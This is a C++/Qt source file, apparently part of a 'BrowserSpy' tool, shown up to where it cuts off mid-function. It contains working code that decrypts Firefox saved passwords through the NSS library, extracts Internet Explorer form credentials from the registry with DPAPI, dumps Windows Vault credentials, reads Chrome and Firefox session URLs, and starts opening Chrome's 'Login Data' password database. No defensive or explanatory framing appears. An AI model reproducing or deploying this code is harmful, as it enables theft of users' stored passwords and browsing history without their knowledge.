#include "browserspy.h"

#include <fstream>
#include <QtCore/QFile>
#include <QtCore/QDebug>
#include <QtCore/QStandardPaths>
#include <QtCore/QDir>
#include <QtCore/QDataStream>
#include <QtCore/QTime>
#include <QtSql/QSqlDatabase>
#include <QtSql/QSqlQuery>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QJsonValue>
#include <QSettings>
#include <QTemporaryFile>
#include "../../3rdparty/Qt-AES/qaesencryption.h"

#include "rawcopy.h"

#ifdef Q_OS_WIN
#   include <Windows.h>
#endif

#ifdef USE_LZ4
#   include "lz4.h"
#endif

#pragma comment(lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

#ifdef Q_OS_WIN
QString toString(LPWSTR str) {
    return QString::fromUtf16((const char16_t*)str);
//    return QString::fromStdWString(std::wstring{(const char*)str, strlen(str)});
}
#endif

namespace firefox {
#ifdef Q_OS_WIN
HMODULE libnss = NULL;
HMODULE libplc = NULL;

typedef struct PK11SlotInfoStr PK11SlotInfo;

// NSS Library functions
typedef SECStatus      (*NSS_Init) (const char *configdir);
typedef SECStatus      (*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void           (*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus      (*PK11_CheckUserPassword) (PK11SlotInfo *slot,char *pw);
typedef SECStatus      (*PK11_Authenticate) (PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef SECStatus      (*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);

// PLC Library functions
typedef char *         (*PL_Base64Decode)( const char *src, PRUint32 srclen, char *dest);

NSS_Init                NSSInit;
NSS_Shutdown            NSSShutdown;
PK11_GetInternalKeySlot PK11GetInternalKeySlot;
PK11_CheckUserPassword  PK11CheckUserPassword;
PK11_FreeSlot           PK11FreeSlot;
PK11_Authenticate       PK11Authenticate;
PK11SDR_Decrypt         PK11SDRDecrypt;
PL_Base64Decode         PLBase64Decode;

char masterPassword[1024] = {0};
int IsNSSInitialized = 0;

static void TerminateFirefoxLibrary() {
    if( IsNSSInitialized  && (NSSShutdown != NULL) )
        (*NSSShutdown)();

    if( libnss != NULL )
        FreeLibrary(libnss);

    if( libplc != NULL )
        FreeLibrary(libplc);
}
static int CheckMasterPassword(char *password) {
    PK11SlotInfo *slot = NULL;
    int ret = 0;

    slot = (*PK11GetInternalKeySlot)();

    if (NULL == slot) {
        printf("PK11_GetInternalKeySlot failed\n");
        return 0;
    }

    // First check if the master password set
    //**********************
    //    if( (*PK11CheckUserPassword)(slot, "") == SECSuccess )
    //    {
    //        printf("Master Password is NOT set\n");
    //        (*PK11FreeSlot) (slot);
    //        return 1;
    //    }

    // Check password
    if( (*PK11CheckUserPassword)(slot, password) == SECSuccess ) {
        printf("Master password is correct\n");
        ret = 1;
    } else {
        printf("Specified master password %s is wrong", password);
        ret = 0;
    }

    (*PK11FreeSlot) (slot);

    return ret;
}
static int InitializeNSSLibrary(char *profilePath, char *password){
    IsNSSInitialized = 0;

    if( (*NSSInit) (profilePath) != SECSuccess ) {
        printf("Initialization failed , Make sure key3.db and cert8.db "\
               "files are present in the specified directory\n");
        TerminateFirefoxLibrary();
        return 0;
    }

    IsNSSInitialized = 1;

    // Check if master password is correct
    if( password != NULL){
        strcpy(masterPassword, password);
    }

    if( CheckMasterPassword( masterPassword ) != 1) {
        TerminateFirefoxLibrary();
        return 0;
    }

    printf("NSS library initiliazed successfully\n");

    return 1;
}
HMODULE LoadLibrary2(char *libDir, char *libName){
    char loadPath[4096] = {0};
    HMODULE tmpLib = NULL;

    strcpy(loadPath, libDir);
    strcat(loadPath, "/");
    strcat(loadPath, libName);

    qDebug() << loadPath;
    if(!strcmp(libName, "nss3.dll")) {
        libnss = LoadLibraryA(loadPath);
        tmpLib = libnss;
    } else if (!strcmp(libName, "plc4.dll")) {
        libplc = LoadLibraryA(loadPath);
        tmpLib = libplc;
    } else {
        tmpLib = LoadLibraryA(loadPath);
    }

    if( NULL == tmpLib ) {
        qDebug() << "Failed to load library" << libName;
        return NULL;
    }

    qDebug() << libName << "loaded successfuly";

    return tmpLib;
}
static bool LoadFirefoxLibraries(QString firefoxPath) {

    QFileInfo fi(firefoxPath);
    QStringList libs = QStringList()
            << /*"mozglue.dll" << "nspr4.dll" << "plc4.dll" << "plds4.dll"
                       << "nssutil3.dll" << "mozsqlite3.dll" << "softokn3.dll" <<*/ "nss3.dll";

    // Load the libraries from firefox path.
    if (firefoxPath == QString()) {
        return false;
    }


    /*foreach(QString lib, libs) {
        auto libPath = QDir::toNativeSeparators(QString(fi.absolutePath() + "\\" + lib));
        qDebug() << "Loading" << libPath;
        if (QFile::exists(libPath)) {
            if(NULL == LoadLibrary2(fi.absolutePath().toLocal8Bit().data(), lib.toLocal8Bit().data())){
                return 1;
            }
        } else {
            qDebug() << "Not exists" << libPath;
        }
    }*/
    QDir::setCurrent(fi.absolutePath());
    libnss = LoadLibraryA("nss3.dll");
    //    libplc = LoadLibraryA(QDir::toNativeSeparators(QString(fi.absolutePath() + "\\plc4.dll")).toLocal8Bit().data());

    if (!libnss/* || NULL == libplc*/) {
        qDebug() << "Error loading libs" << libnss<< QDir::toNativeSeparators(QString(fi.absolutePath() + "\\nss3.dll"));
        return false;
    }
    qDebug() << "Firefox libraries loaded successfully";

    // Load required functions
    NSSInit = (NSS_Init) GetProcAddress(libnss, "NSS_Init");
    NSSShutdown = (NSS_Shutdown)GetProcAddress(libnss, "NSS_Shutdown");
    PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GetProcAddress(libnss, "PK11_GetInternalKeySlot");
    PK11FreeSlot = (PK11_FreeSlot) GetProcAddress(libnss, "PK11_FreeSlot");
    PK11Authenticate = (PK11_Authenticate) GetProcAddress(libnss, "PK11_Authenticate");
    PK11SDRDecrypt = (PK11SDR_Decrypt) GetProcAddress(libnss, "PK11SDR_Decrypt");
    PK11CheckUserPassword = (PK11_CheckUserPassword ) GetProcAddress(libnss, "PK11_CheckUserPassword");
    PLBase64Decode     = ( PL_Base64Decode ) GetProcAddress(libnss, "PL_Base64Decode");

    if( !NSSInit || !NSSShutdown || !PK11GetInternalKeySlot || !PK11Authenticate ||
            !PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword || !PLBase64Decode )  {
        TerminateFirefoxLibrary();
        return false;
    }

    printf("Firefox functions loaded successfully\n");

    return true;

}

static char *get_user_profile_path(){
    int rc = 0;
    char line[1024] = {0};

    /* Get FF passwords database */
    char user_profile[100];
    rc = GetEnvironmentVariableA("UserProfile", user_profile, 100);
    if(0 != rc){
        printf("UserProfile folder: [%s]\n", user_profile);
    }

    char partial_prof_dir[200] = {0};
    strcat(partial_prof_dir, user_profile);
    strcat(partial_prof_dir, "\\Application Data\\Mozilla\\Firefox\\");

    char profile_file[250] = {0};
    strcat(profile_file, partial_prof_dir);
    strcat(profile_file, "\\profiles.ini");
    printf("profile_file: [%s]\n", profile_file);
    // Open the firefox profile setting file
    FILE *profile = fopen(profile_file, "r");

    if( profile == NULL )
    {
        printf("Unable to find firefox profile file: %s\n", profile_file);
        return NULL;
    }

    // Check each line of profile settings file for line "name=default" string
    // This indicates that we are looking under default profile...
    // So one among next few lines will have path information..just copy that...
    char prof_dir[500] = {0};
    strcat(prof_dir, partial_prof_dir);

    int isDefaultFound = 0;
    while(fgets(line, 1024, profile))
    {
        if( !isDefaultFound && ( strstr(line, "Name=default") != NULL) ) {
            isDefaultFound = 1;
            continue;
        }

        // We have got default profile ..now check for path
        if( isDefaultFound ) {
            if( strstr(line,"Path=") != NULL)  {
                char *subdir = (strchr(line, '=') + 1);
                strcat(prof_dir, subdir);
                prof_dir[strlen(prof_dir)-1] = '\0';  // supress line termiantor '\n'
                printf("Firefox Profile dir: [%s]\n", prof_dir);
                break;
            }
        }

    }
    fclose(profile);

    char *ret_prof_dir = (char*)malloc(sizeof(prof_dir));
    strcpy(ret_prof_dir, prof_dir);

    return ret_prof_dir;
}
static int Base64Decode(char *encodedData, char **decodedData, int *decodedLen) {
    int len = strlen( encodedData );
    int adjust = 0;

    // Compute length adjustment
    if (encodedData[len-1] == '=') {
        adjust++;
        if (encodedData[len-2] == '=')
            adjust++;
    }

    *decodedData = ( char *)(*PLBase64Decode)(encodedData, len, NULL);

    if( *decodedData == NULL ) {
        printf("Base64 decoding failed\n");
        return 1;
    }

    *decodedLen = (len*3)/4 - adjust;

    printf("Length of decoded data: %d\n", *decodedLen);

    return 0;
}

static int PK11Decrypt(char *encryptedData, int encryptedLen, char **clearData, int *finalLen) {
    PK11SlotInfo *slot = 0;
    SECStatus status;
    SECItem request;
    SECItem reply;

    // Find token with SDR key
    slot = (*PK11GetInternalKeySlot)();

    if (!slot) {
        printf("PK11_GetInternalKeySlot failed\n");
        return 1;
    }

    if ( (*PK11Authenticate)(slot, PR_TRUE, NULL) != SECSuccess) {
        printf("PK11_Authenticate failed\n");
        return 1;
    }

    // Decrypt the string
    request.data = (unsigned char *)encryptedData;
    request.len = encryptedLen;

    reply.data = 0;
    reply.len = 0;

    status = (*PK11SDRDecrypt)(&request, &reply, NULL);

    if (status != SECSuccess) {
        printf("PK11SDR_Decrypt failed (status code: %d)\n", status);
        return 1;
    }

    *clearData = (char*)reply.data;
    *finalLen  = reply.len;

    // Free the slot
    (*PK11FreeSlot)(slot);

    return 0;
}
static int DecryptSecretString(char *encodedData, char **clearData) {
    char *decodedData = NULL;
    int decodedLen = 0;
    char *finalData = NULL;
    int finalLen = 0;

    // First do base64 decoding
    if( Base64Decode(encodedData, &decodedData, &decodedLen) || !decodedData ) {
        printf("Base64 decoding of data failed\n");
        return 1;
    }

    // Now do actual PK11 decryption
    if( PK11Decrypt(decodedData, decodedLen, &finalData, &finalLen) || !finalData ) {
        printf("Failed to decrypt the string\n");
        return 1;
    }

    // Decrypted string is not NULL terminated
    *clearData = (char*) malloc( finalLen + 1 );
    memcpy(*clearData, finalData, finalLen);
    *(*clearData + finalLen) = 0;

    return 0;
}
#endif
QByteArray parseJsonlz4RecoveryFilePath(const QString &recoveryFilePath)
{
    const char mozlz4_magic[] = {109, 111, 122, 76, 122, 52, 48, 0};  /* "mozLz40\0" */
    const int decomp_size = 4;  /* 4 bytes size come after the header */
    const size_t magic_size = sizeof mozlz4_magic;
    char *encryptedData = nullptr;
    char *decryptedData = nullptr;

    int readSize = 0;
    size_t outputBufferSize = 0;

    QFile f(recoveryFilePath);
    f.open(QIODevice::ReadOnly);
    QByteArray encryptedByteData = f.readAll();
    f.close();
    if (!encryptedByteData.isEmpty()) {
        encryptedData = encryptedByteData.data();
        readSize = encryptedByteData.size();
    } else {
        qDebug() << "[FirefoxUtils::parseJsonlz4RecoveryFilePath] Empty file";
        return QByteArray();
    }

    if (readSize < magic_size + decomp_size || memcmp(mozlz4_magic, encryptedData, magic_size) != 0) {
        qDebug() << "[FirefoxUtils::parseJsonlz4RecoveryFilePath] Unsupported file format: " + recoveryFilePath;
        return QByteArray();
    }

    size_t i = 0;
    for (i = magic_size; i < magic_size + decomp_size; i++) {
        outputBufferSize += (unsigned char) encryptedData[i] << (8 * (i - magic_size));
    }

    if (!(decryptedData = (char *) malloc(outputBufferSize))) {
        qDebug() << "[FirefoxUtils::parseJsonlz4RecoveryFilePath] Failed to allocate a buffer for an output.";
        return QByteArray();
    }

    int decryptedDataSize = LZ4_decompress_safe(encryptedData + i, decryptedData, (int) (readSize - i), (int) outputBufferSize);
    if (decryptedDataSize < 0) {
        qDebug() << "[FirefoxUtils::parseJsonlz4RecoveryFilePath] Failed to decompress a file: " + recoveryFilePath;
        free(decryptedData);
        return QByteArray();
    }
    QByteArray qDecryptedData = QByteArray(decryptedData);
    free(decryptedData);

    int indexOfLastProperChar = qDecryptedData.lastIndexOf(QLatin1String("}"));
    QByteArray cutData = qDecryptedData.left(indexOfLastProperChar + 1);

//    qDebug() << "[FirefoxUtils::parseJsonlz4RecoveryFilePath] Successfully decompressed a file: " + recoveryFilePath;
//    // Debug: write to a D:/fx.json file
//    QString filename = "/home/karol/Documents/fx.json";
//    QFile file(filename);
//    if (file.open(QIODevice::ReadWrite)) {
//        QTextStream stream(&file);
//        stream << cutData;
//    }
    return cutData;
}
};

namespace chrome {
struct FileHeader {
    qint32 signature;
    qint32 version;
};
}

namespace ie {
#ifdef Q_OS_WIN

#define log_error(x)
//qDebug() << x;
#define log_success(x)
//qDebug() << x;

#define URL_MAX_SIZE 150
#define MAX_HASH_SIZE 1024
#define MAX_URL_HISTORY 50
#define CIPHER_SIZE_MAX 5000

typedef HANDLE HVAULT;

enum VAULT_ELEMENT_TYPE {
    ElementType_Boolean = 0,
    ElementType_Short = 1,
    ElementType_UnsignedShort = 2,
    ElementType_Integer = 3,
    ElementType_UnsignedInteger = 4,
    ElementType_Double = 5,
    ElementType_Guid = 6,
    ElementType_String = 7,
    ElementType_ByteArray = 8,
    ElementType_TimeStamp = 9,
    ElementType_ProtectedArray = 0xA,
    ElementType_Attribute = 0xB,
    ElementType_Sid = 0xC,
    ElementType_Last = 0xD,
    ElementType_Undefined = 0xFFFFFFFF
};

typedef struct _VAULT_BYTE_BUFFER {
    DWORD Length;
    PBYTE Value;
} VAULT_BYTE_BUFFER, *PVAULT_BYTE_BUFFER;

typedef struct _VAULT_ITEM_DATA {
    DWORD SchemaElementId;
    DWORD unk0;
    enum VAULT_ELEMENT_TYPE Type;
    DWORD unk1;
    union {
        BOOL Boolean;
        SHORT Short;
        WORD UnsignedShort;
        LONG Int;
        ULONG UnsignedInt;
        DOUBLE Double;
        GUID Guid;
        LPWSTR String;
        VAULT_BYTE_BUFFER ByteArray;
        VAULT_BYTE_BUFFER ProtectedArray;
        DWORD Attribute;
        DWORD Sid;
    } data;
} VAULT_ITEM_DATA, *PVAULT_ITEM_DATA;

typedef struct _VAULT_ITEM_8 {
    GUID SchemaId;
    PWSTR FriendlyName;
    PVAULT_ITEM_DATA Resource;
    PVAULT_ITEM_DATA Identity;
    PVAULT_ITEM_DATA Authenticator;
    PVAULT_ITEM_DATA PackageSid;
    FILETIME LastWritten;
    DWORD Flags;
    DWORD cbProperties;
    PVAULT_ITEM_DATA Properties;
} VAULT_ITEM, *PVAULT_ITEM;

typedef struct _VAULT_ITEM_7 {
    GUID SchemaId;
    PWSTR FriendlyName;
    PVAULT_ITEM_DATA Resource;
    PVAULT_ITEM_DATA Identity;
    PVAULT_ITEM_DATA Authenticator;
    FILETIME LastWritten;
    DWORD Flags;
    DWORD cbProperties;
    PVAULT_ITEM_DATA Properties;
} VAULT_ITEM_7, *PVAULT_ITEM_7;

typedef DWORD(WINAPI *VaultEnumerateVaults_t)(DWORD flags, PDWORD count, GUID **guids);
typedef DWORD(WINAPI *VaultEnumerateItems_t)(HVAULT handle, DWORD flags, PDWORD count, PVOID *items);
typedef DWORD(WINAPI *VaultOpenVault_t)(GUID *id, DWORD flags, HVAULT *handle);
typedef DWORD(WINAPI *VaultCloseVault_t)(HVAULT handle);
typedef DWORD(WINAPI *VaultFree_t)(PVOID mem);
//typedef unsigned int (__stdcall *VaultGetItem_t)(void *VaultHandle, GUID *pSchemaId, vault_entry_s *pResource, vault_entry_s *pIdentity, vault_entry_s *pPackageSid, HWND *hwndOwner, unsigned int dwFlags, vault_cred_s **ppItem);
typedef DWORD(WINAPI * VaultGetItem_t) (HANDLE vault, LPGUID SchemaId, PVAULT_ITEM_DATA Resource, PVAULT_ITEM_DATA Identity, PVAULT_ITEM_DATA PackageSid, HWND hWnd, DWORD Flags, PVAULT_ITEM * pItem);

typedef struct {
    wchar_t utf_url[URL_MAX_SIZE];
    char url[URL_MAX_SIZE];
} IEUrl;

int load_ie_vault_libs();
int get_ie_vault_creds(QVariantList &list);
int dump_explorer(const char *output_file);
int dpapi_decrypt_entropy(char *cipher_data, int len_cipher_data, wchar_t *entropy_password, int len_entropy_password, char **plaintext_data);
int get_registry_history(IEUrl *urls, int *n_urls, int nHowMany);
void get_url_hash(wchar_t *wstrURL, char *strHash, int dwSize);
int get_ie_history();
void add_known_websites(IEUrl *urls, int *n_urls);
int get_ie_registry_creds(QVariantList &list);
int print_decrypted_data(char *decrypted_data, char *url, QVariantList &list);

VaultEnumerateVaults_t VaultEnumerateVaults = NULL;
VaultOpenVault_t VaultOpenVault = NULL;
VaultEnumerateItems_t VaultEnumerateItems = NULL;
VaultGetItem_t VaultGetItem = NULL;
VaultCloseVault_t VaultCloseVault = NULL;
VaultFree_t VaultFree = NULL;
HMODULE module_vault;

/**
 * DPAPI decryption using an password
 *
 * @return 1 on success, -1 on failure
 */
int dpapi_decrypt_entropy(char *cipher_data, int len_cipher_data, wchar_t *entropy_password, int len_entropy_password, char **plaintext_data) {
    DATA_BLOB encrypted_blob, decrypted_blob, entropy_blob;
    encrypted_blob.cbData = len_cipher_data;
    encrypted_blob.pbData = (BYTE*)cipher_data;
    entropy_blob.cbData = len_entropy_password;
    entropy_blob.pbData = (unsigned char *)entropy_password;

    if(!CryptUnprotectData(&encrypted_blob, NULL, &entropy_blob, NULL, NULL, 0, &decrypted_blob)) {
        log_error("CryptUnprotectData() failure");
        return -1;
    }
    *plaintext_data = (char*)malloc(decrypted_blob.cbData + 1);
    if(*plaintext_data == 0) {
        log_error("malloc() failure");
        free(*plaintext_data);
        return -1;
    }
    memcpy(*plaintext_data, decrypted_blob.pbData, decrypted_blob.cbData);
    (*plaintext_data)[decrypted_blob.cbData] = '\0';

    return 1;
}


/**
 * Get the IE URLs registry from the "TypeURLs" entry
 *
 * @return 1 on success, -1 on failure
 */
int get_registry_history(IEUrl *urls, int *n_urls, int nHowMany) {
    char szTemp[8];
    HKEY hKey;
    DWORD dwLength, dwType;

    if(RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\TypedURLs", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) {
        log_error("RegOpenKeyEx() failure");
        return -1;
    }

    int added_urls = *n_urls;
    int nURL;
    for(nURL = 0; nURL < nHowMany; nURL++){
        sprintf(szTemp, "url%d", (nURL + 1));
        if(RegQueryValueExA(hKey, szTemp, NULL, NULL, NULL, &dwLength) == ERROR_SUCCESS){
            char *szURL = (char *)malloc(dwLength+1);
            if(szURL == 0) {
                log_error("malloc() failure");
                return -1;
            }
            if(RegQueryValueExA(hKey, szTemp, NULL, &dwType, (LPBYTE)szURL, &dwLength) == ERROR_SUCCESS){
                if(dwType == REG_SZ) {
                    *n_urls+=1;
                    memcpy(urls[nURL+added_urls].url, szURL, dwLength);
                    urls[nURL+added_urls].url[dwLength] = '\0';

                    // 1 wide char = 2 bytes
                    int utf_length = (int)dwLength*2;
                    mbstowcs(urls[nURL+added_urls].utf_url, szURL, dwLength);
                    urls[nURL+added_urls].url[utf_length] = '\0';
                }
            }
            free(szURL);
        }
    }
    RegCloseKey(hKey);
    return 1;
}

/**
 * Get the SHA1 hash value for a given url
 *
 * @return
 */
void get_url_hash(wchar_t *wstrURL, char *strHash, int dwSize) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;

    CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv,CALG_SHA1, 0, 0,&hHash);
    if(CryptHashData(hHash, (const BYTE *)wstrURL, (wcslen(wstrURL)+1)*2, 0)) {
        DWORD dwHashLen=20;
        BYTE Buffer[20];

        if(CryptGetHashParam(hHash, HP_HASHVAL, Buffer, &dwHashLen,0)) {
            char TmpBuf[MAX_HASH_SIZE];
            unsigned char tail=0;

            for(int i=0;i<20;i++) {
                unsigned char c = Buffer[i];
                tail+=c;
                sprintf_s(TmpBuf, MAX_HASH_SIZE, "%s%2.2X", strHash, c);
                strcpy_s(strHash, dwSize, TmpBuf);
            }
            // add the last 2 bytes
            sprintf_s(TmpBuf, MAX_HASH_SIZE, "%s%2.2X",strHash,tail);
            strcpy_s(strHash, dwSize, TmpBuf);
        }
        CryptDestroyHash(hHash);
    }
    CryptReleaseContext(hProv, 0);
}

/**
 * Get the IE history
 *
 * @return 1 on success, -1 on failure
 */
int get_ie_history() {
    // TODO

    return 1;
}

/**
 * Add Some obvious websites to the list of websites
 *
 * @return
 */
void add_known_websites(IEUrl *urls, int *n_urls) {
    // https://stackoverflow.com/questions/4832082/c-double-character-pointer-declaration-and-initialization
  /*  unsigned char *known_websites[] = {"https://www.facebook.com/", "http://www.facebook.com", "https://facebook.com/", "https://www.gmail.com/", "https://accounts.google.com/", "https://accounts.google.com/servicelogin"};
    int total_size = sizeof(known_websites) / sizeof(*known_websites);
    for(int i = 0; i < total_size; i++) {
        memcpy(urls[i].url, known_websites[i], strlen(known_websites[i]));
        urls[i].url[strlen(known_websites[i])] = '\0';
        mbstowcs(urls[i].utf_url, urls[i].url, strlen(urls[i].url));
        urls[i].utf_url[strlen(urls[i].url)*2] = '\0';
        *n_urls+=1;
    }
    */
}

/**
 * Main function to retrieve credentials from the registry
 *
 * @return 1 on success, -1 on failure
 */
int get_ie_registry_creds(QVariantList &list) {
    IEUrl urls[MAX_URL_HISTORY];
    int n_urls = 0;
    add_known_websites(urls, &n_urls);
    if(get_registry_history(urls, &n_urls, MAX_URL_HISTORY - n_urls) == -1) {
        log_error("get_registry_history() failure");
    }
    // get_ie_history(urls);

    HKEY hKey;
    if(ERROR_SUCCESS != RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2", 0, KEY_QUERY_VALUE, &hKey)) {
        log_error("RegOpenKeyEx() failure");
        return -1;
    }

    char url_hash[MAX_HASH_SIZE];
    char reg_hash[MAX_HASH_SIZE];
    DWORD size = MAX_HASH_SIZE;
    int i = 0;
    char *decrypted_data;

    while(ERROR_NO_MORE_ITEMS != RegEnumValueA(hKey, i, reg_hash, &size, NULL,NULL, NULL, NULL)) {
        for(int j = 0; j < n_urls; j++) {
            memset(url_hash, 0, MAX_HASH_SIZE);
            get_url_hash(urls[j].utf_url, url_hash, MAX_HASH_SIZE);
            if(strcmp(url_hash, reg_hash) == 0) {
                int len_cipher_data = CIPHER_SIZE_MAX;
                char *cipher_data = new char[len_cipher_data];
                if(RegQueryValueExA(hKey, reg_hash, 0, &size, (LPBYTE)cipher_data, (long unsigned int *)&len_cipher_data) != ERROR_SUCCESS) {
                    log_error("RegQueryValueEx() failure");
                }

                size_t url_length = (wcslen(urls[j].utf_url)+1)*2;
                if(dpapi_decrypt_entropy(cipher_data, len_cipher_data, urls[j].utf_url, url_length, &decrypted_data) == -1) {
                    log_error("dpapi_decrypt() failure");
                }
                print_decrypted_data(decrypted_data, urls[j].url, list);
                free(decrypted_data);
            }
        }
        // Needed to for the next entry
        size = MAX_HASH_SIZE;
        i++;
    }
    RegCloseKey(hKey);

    return 1;
}

/**
 * Function to print the registry DPAPI decrypted data
 *
 * @return 1 on success, -1 on failure
 */
int print_decrypted_data(char *decrypted_data, char *url, QVariantList &list) {
    unsigned int HeaderSize;
    unsigned int DataMax;
    memcpy(&HeaderSize,&decrypted_data[4],4);
    memcpy(&DataMax,&decrypted_data[20],4);

    QString sUrl(url);
    QString username;
    QString password;
    char *pInfo = &decrypted_data[36];
    for(int n = 0; n < (int)DataMax; n++){
        //FILETIME ft,ftLocal;
        //SYSTEMTIME st;
        //memcpy(&ft,pInfo+4,8);
        //FileTimeToLocalFileTime(&ft,&ftLocal);
        //FileTimeToSystemTime(&ftLocal, &st);

        unsigned int offset;
        memcpy(&offset,pInfo,4);
        if(n % 2 == 0) {
//            log_success("Website : %s", url);
//            log_success("Username : %ls", (wchar_t *)&decrypted_data[HeaderSize+12+offset]);
            username = toString((wchar_t *)&decrypted_data[HeaderSize+12+offset]);
        }
        else {
//            log_success("Password: %ls\n", (wchar_t *)&decrypted_data[HeaderSize+12+offset]);
//            if(output_file != NULL) {
//                fprintf(output_fd, "\"%ls\"\n", (wchar_t *)&decrypted_data[HeaderSize+12+offset]);
//            }
            password = toString((wchar_t *)&decrypted_data[HeaderSize+12+offset]);

            BrowserSpy::addPasswordToList(list, "ie", sUrl, username, password);
        }



        // Data is 16 bytes length padded
        pInfo+=16;
    }

    return 1;
}

/**
 * Load the Windows IE necessary functions from the vaultcli
 *
 * @return 1 on success, -1 on failure
 */
int load_ie_vault_libs() {
    module_vault = LoadLibraryA("vaultcli.dll");
    if(module_vault == NULL) {
        log_error("LoadLibary() failure");
        return -1;
    }

    VaultEnumerateVaults = (VaultEnumerateVaults_t) GetProcAddress(module_vault, "VaultEnumerateVaults");
    VaultOpenVault = (VaultOpenVault_t)GetProcAddress(module_vault, "VaultOpenVault");
    VaultEnumerateItems = (VaultEnumerateItems_t)GetProcAddress(module_vault, "VaultEnumerateItems");
    VaultGetItem = (VaultGetItem_t)GetProcAddress(module_vault, "VaultGetItem");
    VaultCloseVault = (VaultCloseVault_t)GetProcAddress(module_vault, "VaultCloseVault");
    VaultFree = (VaultFree_t)GetProcAddress(module_vault, "VaultFree");

    if (!VaultEnumerateItems || !VaultEnumerateVaults || !VaultFree || !VaultOpenVault || !VaultCloseVault || !VaultGetItem) {
        log_error("GetProcAddress() failure");
        FreeLibrary(module_vault);
        return -1;
    }

    return 1;
}

/**
 * Main function to retrieve vault IE credentials
 *
 * @return 1 on success, -1 on failure
 */
int get_ie_vault_creds(QVariantList &passwords) {
    if(load_ie_vault_libs() == -1) {
        log_error("load_explorer_libs() failure");
        return -1;
    }

    DWORD vaults_counter, items_counter;
    LPGUID vaults;
    HANDLE hVault;
    PVOID items;
    PVAULT_ITEM vault_items, pvault_items;
    //PVAULT_ITEM_7 vault_test, pvault_test;

    if(VaultEnumerateVaults(0, &vaults_counter, &vaults) != ERROR_SUCCESS) {
        log_error("VaultEnumerateVaults() failure");
        return -1;
    }

    for(int i = 0; i < (int)vaults_counter; i++) {
        // We open the vault
        if (VaultOpenVault(&vaults[i], 0, &hVault) != ERROR_SUCCESS) {
            log_error("VaultOpenVault() failure");
            return -1;
        }

        if (VaultEnumerateItems(hVault, 512, &items_counter, &items) != ERROR_SUCCESS) {
            log_error("VaultEnumerateItems() failure");
            return -1;
        }
        vault_items = (PVAULT_ITEM)items;

        for(int j = 0; j < (int)items_counter; j++) {
//            qDebug() << "Source: %ls" << vault_items[j].FriendlyName;
            auto url = toString(vault_items[j].Resource->data.String);
            auto username = toString(vault_items[j].Identity->data.String);
            QString password;

            pvault_items = NULL;
            if (VaultGetItem(hVault, &vault_items[j].SchemaId, vault_items[j].Resource, vault_items[j].Identity, vault_items[j].PackageSid, NULL, 0, &pvault_items) != 0) {
                log_error("VaultGetItem() failure");
            }

            // If the password is not empty
            if (pvault_items->Authenticator != NULL && pvault_items->Authenticator->data.String != NULL) {
                password = toString(pvault_items->Authenticator->data.String);
            }

            ::BrowserSpy::addPasswordToList(passwords, "ie", url, username, password);
            VaultFree(pvault_items);
        }
        VaultFree(vault_items);
        VaultCloseVault(&hVault);
    }

    VaultFree(vaults);
    FreeLibrary(module_vault);
    return 1;
}
#endif
}

BrowserSpy::BrowserSpy()
{

}

QStringList BrowserSpy::readChromeUrls()
{
    auto path = getChromePath() + "Current Session";

    if (!QFile::exists(path)) {
        qDebug() << "the file not found:" << path;
        return QStringList();
    }

    if (!copyFile(path, true))
        return QStringList();

    QFile f(path);
    if (f.open(QIODevice::ReadOnly)) {
        chrome::FileHeader header;
        f.read(reinterpret_cast<char*>(&header),
               sizeof(header));
        qDebug() << header.signature << header.version << (header.signature == 0x53534E53);

        QMap<int, QString> urls;
        while (!f.atEnd()) {
            quint16 size;
            quint8 id;

            f.read(reinterpret_cast<char *>(&size), 2);
            f.read(reinterpret_cast<char *>(&id), 1);

            if (!size) {
                qDebug() << "Corrupted File!";
                return QStringList();
            }
            QByteArray data;
            if (id == 6) {
                int payload_size;
                int tab_id;
                int index;
                int ssize;
                f.read(reinterpret_cast<char *>(&payload_size), 4);
                f.read(reinterpret_cast<char *>(&tab_id), 4);
                f.read(reinterpret_cast<char *>(&index), 4);
                f.read(reinterpret_cast<char *>(&ssize), 4);
                auto url = QString(f.read(ssize));
                data = f.read(size - 17 - ssize);
                urls.insert(tab_id, url);
                //                qDebug() << tab_id << index<< "url=" << url;
            } else {
                data = f.read(size - 1);
            }
            //            qDebug() << "#" <<id << "   size=" <<size;
            //            qDebug() << data;
        }


        f.close();
        return urls.values();
    } else {
        qDebug() << "unable to open file";
    }
    return QStringList();
}

QStringList BrowserSpy::readFirefoxUrls()
{
#ifdef USE_LZ4
#ifdef Q_OS_WIN
    QString firefoxPath = QString(firefox::get_user_profile_path());
#else
    QString firefoxPath = QDir::homePath() + "/.mozilla/firefox/";
#endif


    QString lz4file = firefoxPath + "\\sessionstore-backups\\recovery.jsonlz4";
    QStringList list;
//    QString lz4file = "C:\\Users\\Administrator\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\5ndayfjs.default\\sessionstore-backups\\recovery.jsonlz4";
    auto content = firefox::parseJsonlz4RecoveryFilePath(lz4file);
    auto jsonObj = QJsonDocument::fromJson(content).object();
    if (jsonObj == QJsonObject())
        return QStringList();
    auto windows = jsonObj.value("windows").toArray();
    foreach (auto window, windows) {
        auto obj = window.toObject();
        if (obj == QJsonObject())
            continue;

        auto tabs = obj.value("tabs").toArray();
        foreach (auto tab, tabs) {
            auto entries = tab.toObject().value("entries").toArray();
            foreach (auto e, entries) {
                list.append(e.toObject().value("url").toString());
            }
        }
    }
    return list;
#endif
    return QStringList();
}

QVariantList BrowserSpy::readChromePasswords()
{
    auto dbFile = getChromePath() + "Login Data";
    if (!QFile::exists(dbFile)) {
        qDebug() << "The file" << dbFile << "does not exists";
        return QVariantList();
    }


    if (!copyFile(dbFile)) {
